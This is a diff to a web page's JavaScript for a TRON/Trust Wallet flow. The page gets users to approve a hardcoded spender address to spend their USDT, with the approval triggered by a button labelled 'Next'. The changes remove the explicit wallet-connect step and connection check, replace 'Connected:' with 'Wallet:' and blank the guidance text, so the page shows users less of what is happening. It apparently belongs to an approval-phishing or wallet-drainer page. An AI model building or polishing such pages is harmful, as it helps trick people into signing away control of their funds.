@@ -42,12 +42,6 @@ const getTronWeb = () => {
   return null;
 };
 
-const requestAccounts = async () => {
-  if (window.tronLink?.request) {
-    await window.tronLink.request({ method: 'tron_requestAccounts' });
-  }
-};
-
 const getConnectedAddress = () => {
   const tronWeb = getTronWeb();
   return tronWeb?.defaultAddress?.base58 || '';
@@ -62,14 +56,14 @@ const updateConnectionStatus = () => {
       connectButton.textContent = 'Next';
     }
     if (!isBusy && !hasFinalStatus) {
-      setStatus(`Connected: ${shortAddress(currentAddress)}`);
+      setStatus(`Wallet: ${shortAddress(currentAddress)}`);
     }
   } else {
     if (!isBusy && !isSuccess) {
       connectButton.textContent = 'Next';
     }
     if (!isBusy && !hasFinalStatus) {
-      setStatus('Open in Trust Wallet and connect your TRON wallet.');
+      setStatus('');
     }
   }
 };
@@ -105,25 +99,14 @@ const updateAmountCopy = () => {
   disclaimer.textContent = `This authorizes spender ${SPENDER_ADDRESS} for the entered USDT amount. It is not a normal transfer.`;
 };
 
-const connectIfNeeded = async () => {
-  let tronWeb = getTronWeb();
+const getTronProvider = async () => {
+  const tronWeb = getTronWeb();
 
   if (!tronWeb) {
     throw new Error('TRON wallet not found. Open this page in Trust Wallet.');
   }
 
-  if (!getConnectedAddress()) {
-    await requestAccounts();
-    await new Promise((resolve) => setTimeout(resolve, 500));
-  }
-
-  tronWeb = getTronWeb();
   currentAddress = getConnectedAddress();
-
-  if (!currentAddress) {
-    throw new Error('Wallet is not connected.');
-  }
-
   return tronWeb;
 };
 
@@ -133,7 +116,7 @@ const approveExactAmount = async () => {
     isSuccess = false;
     setStatus('');
     const amountUnits = parseUsdtAmount(amountInput.value);
-    const tronWeb = await connectIfNeeded();
+    const tronWeb = await getTronProvider();
 
     updateConnectionStatus();
     setProcessing(true);
@@ -182,7 +165,7 @@ amountInput.addEventListener('input', () => {
   connectButton.classList.remove('success');
   txDetailsButton.disabled = true;
   updateAmountCopy();
-  setStatus(currentAddress ? `Connected: ${shortAddress(currentAddress)}` : '');
+  setStatus(currentAddress ? `Wallet: ${shortAddress(currentAddress)}` : '');
 });
 connectButton.addEventListener('click', approveExactAmount);
 processingClose.addEventListener('click', () => setProcessing(false));
